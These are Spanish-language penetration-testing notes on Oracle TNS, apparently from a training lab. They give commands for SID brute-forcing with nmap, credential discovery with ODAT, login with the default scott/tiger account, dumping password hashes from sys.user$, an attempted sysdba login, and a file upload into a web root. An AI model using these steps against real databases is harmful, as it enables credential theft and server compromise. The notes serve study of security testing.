`Oracle Transparent Network Substrate`(`TNS`) es un protocolo de comunicación que facilita la comunicación entre bases de datos Oracle y aplicaciones a través de redes.
Puerto TCP 1521 por defecto, configurable durante instalación.

------
En resumen, el software Oracle Net Services del lado del cliente utiliza el `tnsnames.ora`Archivo para resolver nombres de servicio a direcciones de red, mientras que el proceso de escucha utiliza el `listener.ora`Archivo para determinar los servicios que debe escuchar y el comportamiento del oyente.

--------

### Enumeración y explotación

#### Nmap
```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
##### Odat instalado en MV kali, ruta /home/kali/odat
```
./odat.py -h
```
Prueba todos los modulos disponibles // puede entregar credenciales
```
./odat.py all -s 10.129.204.235
```

#### Interactuar con la bd
```
sqlplus scott/tiger@10.129.204.235/XE
```
##### comandos utiles
```
select table_name from all_tables;
```
```
select * from user_role_privs;
```
```
select name, password from sys.user$;
```

### Prueba conexión con privilegios elevados
```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```


### Subida de archivos con odat desde bd hacia web
```
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
```
curl -X GET http://10.129.204.235/testing.txt
```

